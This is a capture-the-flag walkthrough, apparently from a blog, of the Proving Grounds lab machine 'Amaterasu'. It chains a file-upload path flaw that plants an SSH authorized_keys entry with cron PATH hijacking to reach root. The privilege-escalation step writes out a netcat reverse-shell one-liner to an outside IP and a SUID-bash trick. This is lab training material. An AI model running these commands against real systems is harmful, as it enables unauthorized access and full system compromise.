---
title: Amaterasu
categories: [Proving Grounds Play]
tags: [authorized_keys, crontab, PrivEsc]
image:
  path: https://i.ytimg.com/vi/SReeiX2pQnY/hqdefault.jpg
  alt:  Amaterasu Machine 🖥️
---


## **Description ⤵️**

>
💡 This machine is new and very interesting in terms of file upload and getting shell after altering with .ssh directory .
{: .prompt-tip }


### Let’s find the IP Address first >>

```bash
IP : 192.168.171.249
```
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ sudo nmap -sC -sV -p- -T4 192.168.171.249       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 21:18 IST
Stats: 0:05:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.47% done; ETC: 21:24 (0:00:12 remaining)
Nmap scan report for 192.168.171.249
Host is up (0.18s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Mon, 03 Jul 2023 15:54:12 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
```
{: .nolineno}

---

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled.png)

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%201.png)

Now I have to use feroxbuster for Directory Traversal →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%202.png)

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%203.png)

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%204.png)

Now lets see the `/file-list?dir=/tmp` directory section →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%205.png)

So it seams that I can see the /tmp directory of inside this machine so lets see something more →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%206.png)

we have a user named as `alfredo` and it also contains .ssh file which contains id_rsa key so lets see how can I access it or how can I break into the shell →

I tried to access the `/file-upload/` directory with curl request so I got this →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%207.png)

Now lets use the curl for POST request to the web →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ curl -L -i -X POST http://192.168.211.249:33414/file-upload        
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Wed, 05 Jul 2023 09:12:10 GMT
Content-Type: application/json
Content-Length: 42
Connection: close

{"message":"No file part in the request"}
```
{: .nolineno}

Now I have to include the headers for File upload so lets take an `example.txt` as a file name for uploading into the web →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%208.png)

Now I saw that the example.txt file got uploaded into the `/tmp` folder →

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%209.png)

lets upload the file into the `/home/alfredo/` directory →

But firstly I got to know that only these extensions of files are allowed to upload into the system →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file="@/home/kali/Downloads/Proving_Ground/Amaterasu/hello" -F filename="hello" http://192.168.211.249:33414/file-upload
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Wed, 05 Jul 2023 09:18:51 GMT
Content-Type: application/json
Content-Length: 67
Connection: close

{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```
{: .nolineno}

So now lets try that file to upload into the users directory →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file="@/home/kali/Downloads/Proving_Ground/Amaterasu/example.txt" -F filename="/home/alfredo/example.txt" http://192.168.211.249:33414/file-upload
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Wed, 05 Jul 2023 09:21:31 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%2010.png)

If I can upload a file into the alfredo directory so lets include our `authorized_key` from attckers machine →

Now In attackers machine with ssh-keygen I created the keys so lets transfer it to `/home/alfredo/.ssh/authorized_keys` →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ ssh-keygen                              
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:0EVUwRGUiPRxpxY+B5+ryFEq9wfwiq+BUsaz0yRNDcw kali@kali
The keys randomart image is:
+---[RSA 3072]----+
|       +o+==X=.  |
|       .E=.+o* . |
|      . o + * +  |
|     . +   * o . |
|      * S + o .  |
|     o B = = o   |
|    . + + + o .  |
|     . . o   .   |
|        ...      |
+----[SHA256]-----+
```
{: .nolineno}

Now I first tried it I failed because it does not contains any extensions so I converted into .txt extension then I tried it →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ cp id_rsa.pub id_rsa.pub.txt
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file="@id_rsa.pub.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.230.249:33414/file-upload                                 
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Thu, 06 Jul 2023 07:23:59 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}
```
{: .nolineno}

---

## SHELL ➡️

Now lets try ssh into the alfredo user →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Amaterasu]
└─$ sudo ssh alfredo@192.168.230.249 -p 25022 -i id_rsa
[sudo] password for kali: 
The authenticity of host '[192.168.230.249]:25022 ([192.168.230.249]:25022)' cant be established.
ED25519 key fingerprint is SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.230.249]:25022' (ED25519) to the list of known hosts.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ whoami
alfredo
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
[alfredo@fedora ~]$ pwd
/home/alfredo
[alfredo@fedora ~]$
```
{: .nolineno}

Now here is local.txt file →

```bash
[alfredo@fedora ~]$ cat local.txt
b25a3490ade72606c99eb6e1fe38db7a
[alfredo@fedora ~]$
```
{: .nolineno}

Now while enumeration further I checked cronjob file I got this →

```bash
[alfredo@fedora ~]$ crontab -l
no crontab for alfredo
[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
[alfredo@fedora ~]$
```
{: .nolineno}

Now lets see the `/usr/local/bin/backup-flask.sh` file →

```bash
[alfredo@fedora restapi]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

[alfredo@fedora restapi]$
```
{: .nolineno}

So I see that the path changes to /home/alfredo/restapi so lets move accordingly , and create a file named as tar with executable permissions and that file show contains this →

```bash
[alfredo@fedora restapi]$ cat tar
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 4444 >/tmp/f
chmod u+s /bin/bash
[alfredo@fedora restapi]$
```
{: .nolineno}

I tried for reverse shell but not got that So what I did was that the script add a SUID bit to a binary , that I will have access to. The script runs every minute (according to the crontab). So a minute later I check the find binary and…

```bash
[alfredo@fedora restapi]$ ls -al /bin/bash
-rwxr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
[alfredo@fedora restapi]$ 
[alfredo@fedora restapi]$ ls -al /bin/bash
-rwsr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
```
{: .nolineno}

Now lets root this machine with bash command →

```bash
[alfredo@fedora restapi]$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# id
uid=1000(alfredo) gid=1000(alfredo) euid=0(root) groups=1000(alfredo)
bash-5.1# cd /root
bash-5.1# ls -al
total 56
dr-xr-x---.  3 root root  210 Jul  6 03:22 .
dr-xr-xr-x. 17 root root  244 Mar 28 03:19 ..
-rw-------.  1 root root  665 Jan 24 05:22 anaconda-ks.cfg
-rw-------.  1 root root  260 Mar 28 03:23 .bash_history
-rw-r--r--.  1 root root   18 Jan 28  2021 .bash_logout
-rw-r--r--.  1 root root  141 Jan 28  2021 .bash_profile
-rw-r--r--.  1 root root  429 Jan 28  2021 .bashrc
-rw-r--r--.  1 root root 9526 Jan 12 07:50 [build.sh](http://build.sh/)
-rw-r--r--.  1 root root  100 Jan 28  2021 .cshrc
-rw-------   1 root root   20 Mar 28 03:22 .lesshst
-rwx------.  1 root root   33 Jul  6 03:23 proof.txt
-rw-r--r--.  1 root root 4529 Mar 28 03:09 [run.sh](http://run.sh/)
drwx------.  2 root root   38 Mar 28 03:18 .ssh
-rw-r--r--.  1 root root  129 Jan 28  2021 .tcshrc
bash-5.1# cat proof.txt
72240fac56d1edb09c402c9d6cd99d0e
bash-5.1#
```